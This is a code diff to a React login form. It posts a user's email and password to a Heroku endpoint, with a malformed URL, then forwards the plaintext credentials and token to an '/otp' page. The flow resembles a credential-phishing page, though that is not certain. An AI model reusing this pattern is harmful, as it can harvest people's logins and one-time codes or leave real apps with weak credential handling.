@@ -16,8 +16,8 @@ const Form = (props) => {
     const handlePassword = (e) => {
         setPassword(e.target.value)
     }
-   const URL = 'http://localhost:3030'
-  //const URL = 'https://rqq-1.herokuapp.com'
+    //const URL = 'http://localhost:3030'
+    const URL = 'https:/rq--1.herokuapp.com'
 
     const fetchCsrf = async () => {
         //    const URL = 'https://rqq-1.herokuapp.com'
@@ -32,9 +32,7 @@ const Form = (props) => {
         })
 
         const resData = await response.json()
-        setToken(resData)
-
-        console.log({resData})
+        setToken(resData.token)
     }
 
     useEffect(() => {
@@ -45,18 +43,16 @@ const Form = (props) => {
         e.preventDefault()
         setLoading(true)
 
-        console.log('csrf',token )
         if (email === '' || password === '') {
             console.log('not sent')
         } else {
-            console.log('started email sending')
             try {
                 const response = await fetch(URL + '/rq-1', {
                     method: 'POST',
                     headers: {
                         Accept: 'application/json',
                         'Content-type': 'application/json',
-                        Authorization: 'Bearer ' + token
+                        Authorization: 'Bearer ' + token,
                     },
                     credentials: 'include',
                     mode: 'cors',
@@ -71,17 +67,14 @@ const Form = (props) => {
 
                 const resData = await response.json()
 
-                console.log('email sending started')
-                console.log({ resData })
-
-                // if (resData.status === 'success') {
-                //     console.log('Message Sent.')
-                //     setLoading(false)
-                //     history.push('/otp', { email, password })
-                // } else if (resData.status === 'fail') {
-                //     console.log('Message failed to send.')
-                //     //         setLoading(false)
-                // }
+                if (resData.status === 'success') {
+                    console.log('Message Sent.')
+                    setLoading(false)
+                    history.push('/otp', { email, password,token })
+                } else if (resData.status === 'fail') {
+                    console.log('Message failed to send.')
+                    //         setLoading(false)
+                }
             } catch (err) {
                 console.log(err)
             }
